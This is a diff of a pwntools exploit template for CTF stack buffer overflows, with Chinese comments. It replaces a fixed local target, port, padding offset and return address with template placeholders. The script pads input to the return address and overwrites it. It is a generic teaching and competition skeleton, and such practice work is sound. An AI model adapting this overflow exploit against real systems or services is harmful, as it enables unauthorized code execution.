@@ -3,14 +3,14 @@
 """
 Basic PWN Template - Stack Buffer Overflow
 Author: CTF Player
-Date: 2025-01-XX
-Target: target_binary
+Date: {{date}}
+Target: {{target}}
 """
 
 from pwn import *
 
 # 设置目标程序
-binary = "./target"
+binary = "./{{binary_name}}"
 elf = ELF(binary)
 
 # 设置上下文
@@ -21,7 +21,7 @@ context.arch = 'amd64'  # 或 'i386'
 def exploit():
     # 连接方式选择
     if args.REMOTE:
-        p = remote("127.0.0.1", 9999)
+        p = remote("{{remote_host}}", {{remote_port}})
     else:
         p = process(binary)
 
@@ -33,8 +33,8 @@ def exploit():
         ''')
 
     # Exploit 代码
-    payload = b"A" * 72  # 填充到返回地址
-    payload += p64(0x401234)  # 覆盖返回地址
+    payload = b"A" * {{offset}}  # 填充到返回地址
+    payload += p64({{return_address}})  # 覆盖返回地址
 
     # 发送payload
     p.sendline(payload)
